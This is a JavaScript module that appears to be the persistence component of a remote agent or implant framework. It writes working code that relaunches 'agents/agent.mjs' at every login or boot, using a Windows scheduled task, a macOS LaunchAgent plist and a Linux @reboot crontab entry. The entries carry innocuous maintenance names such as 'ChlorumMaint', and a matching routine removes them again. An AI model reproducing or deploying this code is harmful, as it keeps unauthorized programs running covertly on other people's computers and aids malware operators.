// agents/perchlorate.mjs — persistence component
//
// perchlorates are stable until you ask them not to be. This module
// records a boot-time relauncher for the node and can remove it again
// on kill. Every primitive is wrapped so a missing privilege level
// degrades to "no persistence" instead of a crash.
//
//   windows : schtasks on-logon task
//   linux   : @reboot crontab entry
//   macos   : launchd agent plist

import { execFileSync } from "node:child_process";
import { existsSync, writeFileSync } from "node:fs";
import { homedir, platform } from "node:os";
import { join } from "node:path";

const TASK_NAME = "ChlorumMaint";

function run(cmd, args) {
  try {
    return { ok: true, out: execFileSync(cmd, args, { timeout: 15_000, encoding: "utf8" }) };
  } catch (err) {
    return { ok: false, out: String(err.message) };
  }
}

function scriptDir() {
  return process.cwd();
}

export const perchlorate = {
  apply(base, taskId) {
    const dir = scriptDir();
    const results = { platform: platform(), applied: [] };

    if (platform() === "win32") {
      const action = `cmd /c cd /d "${dir}" && start /min node agents\\agent.mjs ${taskId} ${base}`;
      const r = run("schtasks", [
        "/create", "/tn", TASK_NAME, "/tr", action, "/sc", "onlogon", "/f",
      ]);
      results.applied.push(r.ok ? `schtasks:${TASK_NAME}` : `schtasks failed: ${r.out.slice(0, 120)}`);
    } else if (platform() === "darwin") {
      const plistDir = join(homedir(), "Library", "LaunchAgents");
      const plist = join(plistDir, "com.chlorum.maint.plist");
      try {
        const xml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.chlorum.maint</string>
  <key>ProgramArguments</key><array>
    <string>node</string><string>${join(dir, "agents", "agent.mjs")}</string>
    <string>${taskId}</string><string>${base}</string>
  </array>
  <key>RunAtLoad</key><true/>
</dict></plist>`;
        writeFileSync(plist, xml);
        results.applied.push(`launchd:${plist}`);
      } catch (err) {
        results.applied.push(`launchd failed: ${String(err.message).slice(0, 120)}`);
      }
    } else {
      const marker = "# chlorum-maint";
      const line = `${marker}\n@reboot cd "${dir}" && node agents/agent.mjs ${taskId} ${base}\n`;
      const cron = join(homedir(), ".chlorum", "cron.stamp");
      try {
        const current = execFileSync("crontab", ["-l"], { encoding: "utf8", timeout: 10_000 });
        if (!current.includes(marker)) {
          execFileSync("crontab", ["-"], { input: current + "\n" + line, timeout: 10_000 });
          results.applied.push("crontab:@reboot");
        } else {
          results.applied.push("crontab:already-present");
        }
      } catch {
        // no crontab yet — install a fresh one
        const r = run("sh", ["-c", `echo '${line.replace(/'/g, "")}' | crontab -`]);
        results.applied.push(r.ok ? "crontab:fresh" : `crontab failed: ${r.out.slice(0, 120)}`);
      }
      if (existsSync(cron)) results.applied.push("stamp:present");
    }

    return results;
  },

  clear() {
    const results = { platform: platform(), removed: [] };
    if (platform() === "win32") {
      const r = run("schtasks", ["/delete", "/tn", TASK_NAME, "/f"]);
      results.removed.push(r.ok ? `schtasks:${TASK_NAME}` : `schtasks: none (${r.out.slice(0, 60)})`);
    } else if (platform() === "darwin") {
      const plist = join(homedir(), "Library", "LaunchAgents", "com.chlorum.maint.plist");
      const r = run("sh", ["-c", `rm -f '${plist}'`]);
      results.removed.push(r.ok ? "launchd:removed" : "launchd:failed");
    } else {
      const r = run("sh", ["-c", "crontab -l 2>/dev/null | grep -v chlorum-maint | crontab -"]);
      results.removed.push(r.ok ? "crontab:cleaned" : "crontab:failed");
    }
    return results;
  },
};
